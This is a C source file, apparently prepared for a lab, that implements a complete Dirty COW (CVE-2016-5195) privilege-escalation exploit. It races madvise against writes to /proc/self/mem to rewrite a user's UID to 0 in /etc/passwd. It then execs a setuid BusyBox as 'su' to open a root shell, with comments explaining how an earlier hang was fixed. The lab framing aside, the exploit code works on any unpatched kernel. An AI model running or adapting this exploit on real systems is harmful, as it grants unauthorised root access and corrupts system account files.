/*
 * CVE-2016-5195 Dirty COW — PoCLab reproduction
 *
 * Based on the classic dirtyc0w.c race structure:
 *   https://github.com/scotty-c/dirty-cow-poc/blob/master/dirtyc0w/dirtyc0w.c
 *
 * Approach:
 *   1. mmap /etc/passwd read-only + MAP_PRIVATE.
 *   2. Race madvise(MADV_DONTNEED) against writes to /proc/self/mem.
 *      The kernel bug (4.8 and earlier) allows writing to a MAP_PRIVATE
 *      read-only mapping by racing the COW fault path — the write lands
 *      directly on the shared page-cache page, modifying the file.
 *   3. Replace "user:x:1000:1000:" with "user:x:0000:0000:" in /etc/passwd
 *      (same byte count, so no gap/shift is introduced).
 *   4. Once the patch lands, escalate via:
 *        execv("/usr/bin/suid-target", {"su", "-", "user", NULL})
 *      suid-target is a setuid-root copy of BusyBox in the PoCLab rootfs.
 *      Running it as the "su" applet with EUID=0 switches to "user" without
 *      a password; user's UID in the (now-patched) passwd is 0; BusyBox su
 *      calls setuid(0)/setgid(0), so RUID == EUID == 0; the spawned shell
 *      sees no privilege mismatch and stays root.
 *
 * Why the previous implementation got stuck:
 *   • try_su_id() used execl("/bin/su" ...) from a uid=1000 process.
 *     BusyBox su reads the password via getpass() which opens /dev/tty
 *     directly — it ignores the stdin=/dev/null redirect and blocks
 *     waiting for terminal input. That is the hang.
 *   • The fix: exec suid-target (EUID=0) AS the su binary, so su runs
 *     as root and skips password checking entirely.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

/* ── Tunables ─────────────────────────────────────────────────────────────── */
#define TARGET_PATH   "/etc/passwd"
#define SEARCH_STR    "user:x:1000:1000:"
#define PAYLOAD_STR   "user:x:0000:0000:"
#define TIMEOUT_SEC   90          /* hard wall-clock limit                   */
#define CHECK_EVERY   10000       /* verify file after this many write loops */

_Static_assert(sizeof(SEARCH_STR)  == sizeof(PAYLOAD_STR),
               "SEARCH and PAYLOAD must have the same byte length");

/* ── Shared state between threads ────────────────────────────────────────── */
static volatile int  g_stop;          /* set to 1 to ask threads to exit    */
static void         *g_map;           /* MAP_PRIVATE mapping of the file     */
static size_t        g_map_len;
static const char   *g_payload;       /* bytes to race-write                 */
static size_t        g_payload_len;
static off_t         g_write_offset;  /* byte offset within the mapped file  */

/* ── madvise thread ──────────────────────────────────────────────────────── */
static void *madvise_thread(void *arg)
{
    (void)arg;
    /* Align down to the page boundary containing g_write_offset. */
    long pgsz     = sysconf(_SC_PAGESIZE);
    char *page    = (char *)g_map + (g_write_offset & ~(pgsz - 1));

    while (!g_stop)
        madvise(page, pgsz, MADV_DONTNEED);

    return NULL;
}

/* ── /proc/self/mem write thread ─────────────────────────────────────────── */
static void *procmem_thread(void *arg)
{
    (void)arg;
    char *write_addr = (char *)g_map + g_write_offset;

    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        return NULL;
    }

    /*
     * Tight loop: seek to the target address and write the payload.
     * The DirtyCOW race window is between this write path acquiring a
     * reference to the shared page and the madvise thread evicting it.
     * We check g_stop every CHECK_EVERY iterations to stay responsive.
     */
    unsigned long n = 0;
    while (!g_stop) {
        lseek(fd, (off_t)(uintptr_t)write_addr, SEEK_SET);
        write(fd, g_payload, g_payload_len);
        n++;
        if ((n % CHECK_EVERY) == 0 && g_stop)
            break;
    }

    close(fd);
    return NULL;
}

/* ── Helpers ─────────────────────────────────────────────────────────────── */
static void die(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

/* Read entire file into a malloc'd buffer; caller frees. */
static char *slurp(const char *path, size_t *out_len)
{
    struct stat st;
    if (stat(path, &st) < 0) return NULL;

    char *buf = malloc((size_t)st.st_size + 1);
    if (!buf) return NULL;

    int fd = open(path, O_RDONLY);
    if (fd < 0) { free(buf); return NULL; }

    ssize_t got = 0, total = 0;
    while ((got = read(fd, buf + total, (size_t)st.st_size - total)) > 0)
        total += got;
    close(fd);
    buf[total] = '\0';
    if (out_len) *out_len = (size_t)total;
    return buf;
}

/* Return byte offset of needle in file, or -1. */
static off_t find_in_file(const char *path, const char *needle)
{
    size_t len;
    char *buf = slurp(path, &len);
    if (!buf) return -1;
    char *hit = memmem(buf, len, needle, strlen(needle));
    off_t off  = hit ? (off_t)(hit - buf) : -1;
    free(buf);
    return off;
}

/* Check whether the payload is already present at offset in the file. */
static int file_has_payload(const char *path, off_t offset)
{
    size_t len;
    char *buf = slurp(path, &len);
    if (!buf) return 0;
    int ok = (offset >= 0 &&
              (size_t)offset + g_payload_len <= len &&
              memcmp(buf + offset, g_payload, g_payload_len) == 0);
    free(buf);
    return ok;
}

/* ── Privilege escalation ─────────────────────────────────────────────────
 *
 * Strategy: exec /usr/bin/suid-target (setuid-root BusyBox copy placed in
 * the PoCLab rootfs for this purpose) with argv[0]="su".  Because the binary
 * is setuid-root, EUID=0 when it runs.  BusyBox's su applet, when run as
 * root (EUID=0), switches to the target user without a password prompt.
 * The target user's UID in the (now-patched) /etc/passwd is 0, so su calls
 * setuid(0)/setgid(0), making RUID == EUID == 0.  The child shell inherits
 * RUID=0 and does NOT drop privileges, giving us an interactive root shell.
 *
 * Falls back to /bin/su if suid-target is absent (will prompt for password
 * unless the caller already has EUID=0).
 */
static void escalate(void)
{
    printf("[+] /etc/passwd patched.  Verifying and escalating...\n");
    fflush(stdout);

    /* Print the patched line as proof. */
    size_t len;
    char *buf = slurp(TARGET_PATH, &len);
    if (buf) {
        char *line_start = memmem(buf, len, PAYLOAD_STR, g_payload_len);
        if (line_start) {
            /* Walk back to start of line */
            while (line_start > buf && *(line_start - 1) != '\n')
                line_start--;
            char *line_end = memchr(line_start, '\n', (size_t)(buf + len - line_start));
            if (line_end) *line_end = '\0';
            printf("[+] Patched entry: %s\n", line_start);
        }
        free(buf);
    }

    printf("[*] Launching root shell via suid-target su...\n");
    fflush(stdout);

    /*
     * exec suid-target AS "su":
     *   argv[0] = "su"   → BusyBox dispatches to the su applet
     *   argv[1] = "-"    → login shell (reads /etc/profile)
     *   argv[2] = "user" → target account (now uid=0 in patched passwd)
     */
    char *su_argv[] = { "su", "-", "user", NULL };
    execv("/usr/bin/suid-target", su_argv);

    /* Fallback: plain /bin/su (will need password if not already root) */
    perror("execv suid-target");
    fprintf(stderr, "[!] suid-target not found — trying /bin/su (may prompt for password)\n");
    execv("/bin/su", su_argv);
    perror("execv /bin/su");
}

/* ── main ────────────────────────────────────────────────────────────────── */
int main(void)
{
    struct utsname uts;
    if (uname(&uts) == 0)
        printf("[*] kernel %s %s\n", uts.release, uts.machine);
    printf("[*] running as uid=%d gid=%d\n", getuid(), getgid());
    fflush(stdout);

    /* ── 1. Check if already done ─────────────────────────────────────── */
    g_payload     = PAYLOAD_STR;
    g_payload_len = strlen(PAYLOAD_STR);

    off_t already = find_in_file(TARGET_PATH, PAYLOAD_STR);
    if (already >= 0) {
        printf("[+] %s already patched at offset %ld — skipping race\n",
               TARGET_PATH, (long)already);
        g_write_offset = already;
        escalate();
        return EXIT_SUCCESS;
    }

    /* ── 2. Find the search string ────────────────────────────────────── */
    off_t target_off = find_in_file(TARGET_PATH, SEARCH_STR);
    if (target_off < 0) {
        fprintf(stderr, "[-] could not find \"%s\" in %s\n",
                SEARCH_STR, TARGET_PATH);
        return EXIT_FAILURE;
    }
    g_write_offset = target_off;
    printf("[*] target \"%s\" found at offset %ld in %s\n",
           SEARCH_STR, (long)target_off, TARGET_PATH);

    /* ── 3. Map the target file ───────────────────────────────────────── */
    int fd = open(TARGET_PATH, O_RDONLY);
    if (fd < 0) die("open target");

    struct stat st;
    if (fstat(fd, &st) < 0) die("fstat");
    g_map_len = (size_t)st.st_size;

    g_map = mmap(NULL, g_map_len, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    if (g_map == MAP_FAILED) die("mmap");

    printf("[*] mmap=%p  target=%p  offset=%ld\n",
           g_map, (char *)g_map + g_write_offset, (long)g_write_offset);
    printf("[*] racing madvise(MADV_DONTNEED) vs /proc/self/mem write...\n");
    fflush(stdout);

    /* ── 4. Launch race threads ───────────────────────────────────────── */
    g_stop = 0;

    pthread_t t_madvise, t_procmem;
    if (pthread_create(&t_madvise, NULL, madvise_thread, NULL) != 0)
        die("pthread_create madvise");
    if (pthread_create(&t_procmem, NULL, procmem_thread, NULL) != 0)
        die("pthread_create procmem");

    /* ── 5. Poll for success ──────────────────────────────────────────── */
    time_t start = time(NULL);
    int won = 0;

    while (time(NULL) - start < TIMEOUT_SEC) {
        usleep(200000);   /* check every 200 ms */
        if (file_has_payload(TARGET_PATH, g_write_offset)) {
            won = 1;
            break;
        }
        /* Heartbeat every 5 seconds so user knows it's still running. */
        long elapsed = (long)(time(NULL) - start);
        if (elapsed > 0 && (elapsed % 5) == 0) {
            printf("[*] still racing... %lds elapsed\n", elapsed);
            fflush(stdout);
        }
    }

    g_stop = 1;
    pthread_join(t_madvise, NULL);
    pthread_join(t_procmem, NULL);
    munmap(g_map, g_map_len);

    /* Final check after threads exit (race might have just won). */
    if (!won)
        won = file_has_payload(TARGET_PATH, g_write_offset);

    if (!won) {
        printf("[-] race did not succeed within %d seconds.\n", TIMEOUT_SEC);
        printf("    Possible causes:\n");
        printf("    • kernel already patched (4.8.3+)\n");
        printf("    • QEMU running with only 1 vCPU (add -smp 2)\n");
        printf("    • try increasing TIMEOUT_SEC and re-running\n");
        return EXIT_FAILURE;
    }

    escalate();     /* does not return on success */
    return EXIT_FAILURE;
}
